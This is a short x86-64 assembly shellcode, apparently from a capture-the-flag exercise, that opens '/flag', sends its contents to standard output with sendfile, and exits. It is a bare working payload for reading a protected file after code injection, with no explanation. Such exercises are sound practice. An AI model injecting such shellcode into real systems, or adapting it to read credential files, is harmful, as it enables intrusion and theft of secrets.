.global _start
_start:
.intel_syntax noprefix
        lea eax, [eip + m]
        mov edi, eax
        mov esi, 0
        mov edx, 0
        mov eax, 2
        syscall

        mov edi, 1
        mov esi, eax
        mov eax, 40
        mov edx, 0
        mov r10, 0x100
        syscall

        mov eax, 60
        mov edi, 0
        syscall
m:
        .string "/flag"
